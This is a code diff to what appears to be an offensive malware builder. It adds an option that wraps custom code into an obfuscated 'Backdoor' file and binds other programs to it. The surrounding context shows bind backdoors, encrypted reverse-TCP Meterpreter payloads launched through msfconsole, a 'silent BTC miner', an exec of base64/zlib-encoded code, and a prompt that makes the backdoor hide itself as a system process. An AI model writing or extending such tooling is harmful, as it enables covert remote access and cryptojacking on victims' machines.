@@ -270,6 +270,26 @@ exec(zlib.decompress(base64.b64decode('''+dr+''')),{'s':'''+s+'''})
                 bindfile.close
 
         print('(*) Generated Backdoor and saved as '+name)
+def gen_custom():
+    customshell=input("Please enter the file name containing your code: ")
+    name="ocr"
+
+    with open(customshell, 'r') as cuso:
+        with open(name, 'a+') as ina:
+            for line in cuso:
+                ina.write(line)
+
+
+        opt_bind = input('Do you want to bind another program to this Backdoor?(y/n): ')
+        if opt_bind == 'y':
+            bind_file = input('Please enter the name (in same dir) of the .py you want to bind: ')
+            with open(bind_file, 'r') as bindfile:
+                bindfilecontent=bindfile.read()
+                ina.write(bindfilecontent)
+                bindfile.close
+
+        print('(*) Generated Backdoor and saved as '+name)
+
 def gen_btc_miner():
     global name
     global host
@@ -400,7 +420,7 @@ def postgen():
             print(logo)
             print('Backdoor saved under "dist" folder')
 def rep_syst():
-    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (y/n): ')
+    hide = input('Do you want the backdoor to hide itself and replicate a system proccess? (OSX and linux only) (y/n): ')
     if hide == 'y':
         global name2
         global reps
@@ -542,7 +562,7 @@ print("""
     
         1. Create Bind Backdoor (opens a port on the victim machine and waits for you to connect)
         2. Create Encrypted TCP Meterpreter (can embed in other script) (recommended)
-
+        3. Create Obfuscated file with custom code
         ##########################################################################################
                                                 Miners
         3. Create a silent BTC miner
@@ -586,8 +606,11 @@ if nscan == "2":
         print('wait...')
         a = "msfconsole -q -x 'use multi/handler;set payload python/meterpreter/reverse_tcp_ssl;set LHOST 0.0.0.0; set LPORT "+port+"; exploit'"
         os.system(a)
-
-if nscan == '3':
+if nscan == "3":
+    gen_custom()
+    postgen()
+    rep_syst()
+if nscan == '4':
     gen_btc_miner()
     opt_obf = input('Do you want to obfuscate the generated programm (recommended) (y/n): ')
     encrypted = False
